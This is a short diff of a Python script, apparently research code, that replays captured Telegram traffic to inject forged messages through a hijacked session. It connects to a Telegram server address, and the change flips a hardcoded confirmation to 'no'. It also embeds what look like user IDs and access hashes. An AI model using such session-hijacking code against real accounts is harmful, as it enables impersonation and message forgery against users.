@@ -30,7 +30,7 @@ def send_edited_message(data : str, last_outgoing_message :TGMessage, template_m
 
     init_and_obfuscated_bytes = init + obfuscated_bytes
     # confirm = input("Are you sure? yes/(no)")
-    confirm = "yes"
+    confirm = "no"
     if confirm == "yes":
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_socket.connect(("149.154.167.91", 443))
@@ -96,6 +96,7 @@ def main():
         with open("template", "r") as file:
             template_send_message = deserialize_TL_message(bytes.fromhex(file.read()))
             # send_edited_message("messaggio da una sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message, (1345874644, -7249264267762180610)) #m
+            # send_edited_message("messaggio da una sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message, (1121666620, 2397466072722871659)) #g
             ####### send_edited_message("messaggio da una sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message, (70027891, -3959112350778582311)) #t
             send_edited_message("messaggio da una sessione dirottata",streams[last_normal_stream][0][-1], template_send_message )
             print("stream for session: ",last_normal_stream)
